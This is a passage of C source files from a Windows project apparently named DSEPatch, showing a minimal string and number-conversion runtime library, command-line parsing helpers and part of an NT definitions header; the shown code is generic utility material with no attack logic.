	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`source/DSEPatch/DSEPatch/minirtl/_strcmp.c`:

```c
#include "rtltypes.h"

int _strcmp_a(const char *s1, const char *s2)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

int _strcmp_w(const wchar_t *s1, const wchar_t *s2)
{
	wchar_t	c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strcmpi.c`:

```c
#include "rtltypes.h"

int _strcmpi_a(const char *s1, const char *s2)
{
	char c1, c2;
	
	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

int _strcmpi_w(const wchar_t *s1, const wchar_t *s2)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`source/DSEPatch/DSEPatch/minirtl/_strend.c`:

```c
#include "rtltypes.h"

char *_strend_a(const char *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (char *)s;
}

wchar_t *_strend_w(const wchar_t *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (wchar_t *)s;
}

```

`source/DSEPatch/DSEPatch/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strncmp.c`:

```c
#include "rtltypes.h"

int _strncmp_a(const char *s1, const char *s2, size_t cchars)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = *s1;
		c2 = *s2;
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strncmpi.c`:

```c
#include "rtltypes.h"

int _strncmpi_a(const char *s1, const char *s2, size_t cchars)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strncpy.c`:

```c
#include "rtltypes.h"

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc)
{
	char *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
}

wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc)
{
	wchar_t *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
}

```

`source/DSEPatch/DSEPatch/minirtl/cmdline.c`:

```c
#include <windows.h>

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (ParamLen != NULL)
		*ParamLen = 0;

	if (CmdLine == NULL) {
		if ((Buffer != NULL) && (BufferSize > 0))
			*Buffer = 0;
		return FALSE;
	}

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (CmdLine == NULL)
		return FALSE;

	if (ParamLen != NULL)
		*ParamLen = 0;

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

char *ExtractFilePathA(const char *FileName, char *FilePath)
{
	char *p = (char *)FileName, *p0 = (char *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (char *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath)
{
	wchar_t *p = (wchar_t *)FileName, *p0 = (wchar_t *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (wchar_t *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

```

`source/DSEPatch/DSEPatch/minirtl/cmdline.h`:

```h
#ifndef _CMDLINEH_
#define _CMDLINEH_

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

char *ExtractFilePathA(const char *FileName, char *FilePath);
wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath);

#ifdef UNICODE

#define ExtractFilePath			ExtractFilePathW
#define GetCommandLineParam		GetCommandLineParamW

#else // ANSI

#define ExtractFilePath			ExtractFilePathA
#define GetCommandLineParam		GetCommandLineParamA

#endif

#endif /* _CMDLINEH_ */

```

`source/DSEPatch/DSEPatch/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	1 Dec 2018
*/

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

char *_strcpyn_a(char* dest, const char* src, size_t n);
wchar_t *_strcpyn_w(wchar_t* dest, const wchar_t* src, size_t n);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

char *_strchr_a(const char *s, const char ch);
wchar_t *_strchr_w(const wchar_t *s, const wchar_t ch);


// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w
#define _strcpyn _strcpyn_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w
#define _strchr _strchr_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcpyn _strcpyn_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a
#define _strchr _strchr_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
#define u64tohex u64tohex_a

#define strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`source/DSEPatch/DSEPatch/minirtl/rtltypes.h`:

```h
#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`source/DSEPatch/DSEPatch/minirtl/u64tohex.c`:

```c
#include "rtltypes.h"

size_t u64tohex_a(unsigned long long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c=0; c<16; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

size_t u64tohex_w(unsigned long long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c = 0; c<16; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

```

`source/DSEPatch/DSEPatch/minirtl/u64tostr.c`:

```c
#include "rtltypes.h"

size_t u64tostr_a(unsigned long long x, char *s)
{
	unsigned long long	t = x;
	size_t	i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (char)(x % 10) + '0';
		x /= 10;
	}

	s[r] = (char)0;
	return r;
}

size_t u64tostr_w(unsigned long long x, wchar_t *s)
{
	unsigned long long	t = x;
	size_t	i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (wchar_t)(x % 10) + L'0';
		x /= 10;
	}

	s[r] = (wchar_t)0;
	return r;
}

```

`source/DSEPatch/DSEPatch/minirtl/ultohex.c`:

```c
#include "rtltypes.h"

size_t ultohex_a(unsigned long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

size_t ultohex_w(unsigned long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

```

`source/DSEPatch/DSEPatch/minirtl/ultostr.c`:

```c
#include "rtltypes.h"

size_t ultostr_a(unsigned long x, char *s)
{
	unsigned long	t=x;
	size_t			i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (char)(x % 10) + '0';
		x /= 10;
	}

	s[r] = (char)0;
	return r;
}

size_t ultostr_w(unsigned long x, wchar_t *s)
{
	unsigned long	t=x;
	size_t			i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (wchar_t)(x % 10) + L'0';
		x /= 10;
	}

	s[r] = (wchar_t)0;
	return r;
}

```

`source/DSEPatch/DSEPatch/ntdll/ntos.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019, translated from Microsoft sources/debugger
*
*  TITLE:       NTOS.H
*
*  VERSION:     1.99
*
*  DATE:        15 Jan 2019
*
*  Common header file for the ntos API functions and definitions.
*
*  Only projects required API/definitions.
*
*  Depends on:    Windows.h
*                 NtStatus.h
*
*  Include:       Windows.h
*                 NtStatus.h
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#ifndef NTOS_RTL
#define NTOS_RTL

//
// NTOS_RTL HEADER BEGIN
//

#if defined(__cplusplus)
extern "C" {
#endif

#pragma comment(lib, "ntdll.lib")

#pragma warning(push)
#pragma warning(disable: 4214) // nonstandard extension used : bit field types other than int

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000ull
#endif

#ifndef ABSOLUTE_TIME
#define ABSOLUTE_TIME(wait) (wait)
#endif

#ifndef RELATIVE_TIME
#define RELATIVE_TIME(wait) (-(wait))
#endif

#ifndef NANOSECONDS
#define NANOSECONDS(nanos) (((signed __int64)(nanos)) / 100L)
#endif

#ifndef MICROSECONDS
#define MICROSECONDS(micros) (((signed __int64)(micros)) * NANOSECONDS(1000L))
#endif

#ifndef MILLISECONDS
#define MILLISECONDS(milli) (((signed __int64)(milli)) * MICROSECONDS(1000L))
#endif

#ifndef SECONDS
#define SECONDS(seconds) (((signed __int64)(seconds)) * MILLISECONDS(1000L))
#endif

#ifndef POI //poi-poi
#define POI(addr) *(ULONG *)(addr)
#endif

typedef char CCHAR;
typedef unsigned char UCHAR;
typedef CCHAR KPROCESSOR_MODE;
typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;

#ifndef IN_REGION
#define IN_REGION(x, Base, Size) (((ULONG_PTR)(x) >= (ULONG_PTR)(Base)) && \
            ((ULONG_PTR)(x) <= (ULONG_PTR)(Base) + (ULONG_PTR)(Size)))
#endif

//
// Define alignment macros to align structure sizes and pointers up and down.
//

#ifndef ALIGN_UP_TYPE
#define ALIGN_UP_TYPE(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_UP
#define ALIGN_UP(Address, Type) ALIGN_UP_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_DOWN_TYPE
#define ALIGN_DOWN_TYPE(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_DOWN
#define ALIGN_DOWN(Address, Type) ALIGN_DOWN_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_UP_BY
#define ALIGN_UP_BY(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_DOWN_BY
#define ALIGN_DOWN_BY(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_UP_POINTER_BY
#define ALIGN_UP_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_UP_BY(Pointer, Align))
#endif

#ifndef ALIGN_DOWN_POINTER_BY
#define ALIGN_DOWN_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_DOWN_BY(Pointer, Align))
#endif

#ifndef ALIGN_UP_POINTER
#define ALIGN_UP_POINTER(Pointer, Type) ((PVOID)ALIGN_UP(Pointer, Type))
#endif

#ifndef ALIGN_DOWN_POINTER
#define ALIGN_DOWN_POINTER(Pointer, Type) ((PVOID)ALIGN_DOWN(Pointer, Type))
#endif

#ifndef ARGUMENT_PRESENT
#define ARGUMENT_PRESENT(ArgumentPointer)    (\
    (CHAR *)((ULONG_PTR)(ArgumentPointer)) != (CHAR *)(NULL) )
#endif

#ifndef LOGICAL
#define LOGICAL ULONG
#endif

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define ZwCurrentProcess() NtCurrentProcess()
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define ZwCurrentThread() NtCurrentThread()
#define NtCurrentSession() ((HANDLE)(LONG_PTR)-3)
#define ZwCurrentSession() NtCurrentSession()

//Valid Only for Windows 8+
#define NtCurrentProcessToken() ((HANDLE)(LONG_PTR)-4) 
#define NtCurrentThreadToken() ((HANDLE)(LONG_PTR)-5)
#define NtCurrentEffectiveToken() ((HANDLE)(LONG_PTR)-6)

//
// ntdef.h begin
//
#ifndef RTL_CONSTANT_STRING
char _RTL_CONSTANT_STRING_type_check(const void *s);
#define _RTL_CONSTANT_STRING_remove_const_macro(s) (s)
#define RTL_CONSTANT_STRING(s) \
{ \
    sizeof( s ) - sizeof( (s)[0] ), \
    sizeof( s ) / sizeof(_RTL_CONSTANT_STRING_type_check(s)), \
    _RTL_CONSTANT_STRING_remove_const_macro(s) \
}
#endif

#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) \
    { sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }

// This synonym is more appropriate for initializing what isn't actually const.
#define RTL_INIT_OBJECT_ATTRIBUTES(n, a) RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a)

//
// ntdef.h end
//

#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
#define RtlPointerToOffset(Base, Pointer)  ((ULONG)( ((PCHAR)(Pointer)) - ((PCHAR)(Base))  ))


typedef ULONG CLONG;
typedef LONG KPRIORITY;
typedef short CSHORT;
typedef ULONGLONG REGHANDLE, *PREGHANDLE;
typedef PVOID *PDEVICE_MAP;
typedef PVOID PHEAD;

//
// Valid values for the OBJECT_ATTRIBUTES.Attributes field
//
#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

//
// Callback Object Rights
//
#define CALLBACK_MODIFY_STATE    0x0001
#define CALLBACK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|CALLBACK_MODIFY_STATE )

//
// Debug Object Access Rights
//
#define DEBUG_READ_EVENT        (0x0001)
#define DEBUG_PROCESS_ASSIGN    (0x0002)
#define DEBUG_SET_INFORMATION   (0x0004)
#define DEBUG_QUERY_INFORMATION (0x0008)
#define DEBUG_ALL_ACCESS     (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|DEBUG_READ_EVENT|DEBUG_PROCESS_ASSIGN|\
                              DEBUG_SET_INFORMATION|DEBUG_QUERY_INFORMATION)

//
// Directory Object Access Rights
//
#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)

//
// Event Object Access Rights
//
#define EVENT_QUERY_STATE       0x0001
#define EVENT_MODIFY_STATE      0x0002  
#define EVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

//
// EventPair Object Access Rights
//
#define EVENT_PAIR_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE)

//
// I/O Completion Object Access Rights
//
#define IO_COMPLETION_QUERY_STATE   0x0001
#define IO_COMPLETION_MODIFY_STATE  0x0002  
#define IO_COMPLETION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

//
// KeyedEvent Object Access Rights
//
#define KEYEDEVENT_WAIT 0x0001
#define KEYEDEVENT_WAKE 0x0002
#define KEYEDEVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | KEYEDEVENT_WAIT | KEYEDEVENT_WAKE)

//
// Mutant Object Access Rights
//
#define MUTANT_QUERY_STATE      0x0001
#ifndef MUTANT_ALL_ACCESS //SDK compatibility
#define MUTANT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|MUTANT_QUERY_STATE)
#endif

//
// Port Object Access Rights
//
#define PORT_CONNECT (0x0001)
#define PORT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | PORT_CONNECT)

//
// Profile Object Access Rights
//
#define PROFILE_CONTROL (0x0001)
#define PROFILE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | PROFILE_CONTROL)

//
// Semaphore Object Access Rights
//
#define SEMAPHORE_QUERY_STATE       0x0001
#define SEMAPHORE_MODIFY_STATE      0x0002 
#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3)

//
// SymbolicLink Object Access Rights
//
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYMBOLIC_LINK_QUERY)

//
// Thread Object Access Rights
//
#define THREAD_ALERT   (0x0004)

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
#define THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR 0x00000010 
#define THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET 0x00000020 
#define THREAD_CREATE_FLAGS_INITIAL_THREAD 0x00000080

//
// Worker Factory Object Access Rights
//
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020

#define WORKER_FACTORY_ALL_ACCESS ( \
    STANDARD_RIGHTS_REQUIRED | \
    WORKER_FACTORY_RELEASE_WORKER | \
    WORKER_FACTORY_WAIT | \
    WORKER_FACTORY_SET_INFORMATION | \
    WORKER_FACTORY_QUERY_INFORMATION | \
    WORKER_FACTORY_READY_WORKER | \
    WORKER_FACTORY_SHUTDOWN \
    )

//
// Type Object Access Rights
//
#define OBJECT_TYPE_CREATE (0x0001)
#define OBJECT_TYPE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | OBJECT_TYPE_CREATE)

//
// WMI Object Access Rights
//
#define WMIGUID_QUERY                 0x0001
#define WMIGUID_SET                   0x0002
#define WMIGUID_NOTIFICATION          0x0004
#define WMIGUID_READ_DESCRIPTION      0x0008
#define WMIGUID_EXECUTE               0x0010
#define TRACELOG_CREATE_REALTIME      0x0020
#define TRACELOG_CREATE_ONDISK        0x0040
#define TRACELOG_GUID_ENABLE          0x0080
#define TRACELOG_ACCESS_KERNEL_LOGGER 0x0100
#define TRACELOG_CREATE_INPROC        0x0200
